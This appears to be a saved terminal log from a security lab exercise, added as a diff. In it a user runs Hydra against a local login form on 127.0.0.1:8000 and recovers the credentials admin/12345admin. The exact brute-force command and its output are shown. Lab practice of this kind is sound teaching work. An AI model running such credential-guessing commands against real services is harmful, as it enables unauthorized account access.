@@ -1,0 +1,37 @@
+zsh: corrupt history file /home/jianduojie/.zsh_history
+┌──(jianduojie㉿killer)-[~/Desktop/labs/lab_12/brute-force-server]
+└─$ ls
+main.py  __pycache__  venv
+                                                                                                                                                              
+┌──(jianduojie㉿killer)-[~/Desktop/labs/lab_12/brute-force-server]
+└─$ sudo apt update && sudo apt install hydra -y
+[sudo] password for jianduojie: 
+Hit:1 http://http.kali.org/kali kali-rolling InRelease
+3 packages can be upgraded. Run 'apt list --upgradable' to see them.
+hydra is already the newest version (9.6-3+b1).
+hydra set to manually installed.
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 3
+                                                                                                                                         
+┌──(jianduojie㉿killer)-[~/Desktop/labs/lab_12/brute-force-server]
+└─$ echo "admin" > usernames.txt
+                                                                                                                                         
+┌──(jianduojie㉿killer)-[~/Desktop/labs/lab_12/brute-force-server]
+└─$ echo "12345" > passwords.txt 
+                                                                                                                                         
+┌──(jianduojie㉿killer)-[~/Desktop/labs/lab_12/brute-force-server]
+└─$ echo "12345admin" >> passwords.txt
+                                                                                                                                         
+┌──(jianduojie㉿killer)-[~/Desktop/labs/lab_12/brute-force-server]
+└─$ hydra -L usernames.txt -P passwords.txt 127.0.0.1 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials" -s 8000 -v
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-22 08:12:31
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:1/p:2), ~1 try per task
+[DATA] attacking http-post-form://127.0.0.1:8000/login:username=^USER^&password=^PASS^:Invalid credentials
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] attack finished for 127.0.0.1 (waiting for children to complete tests)
+[8000][http-post-form] host: 127.0.0.1   login: admin   password: 12345admin
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-22 08:12:32
+
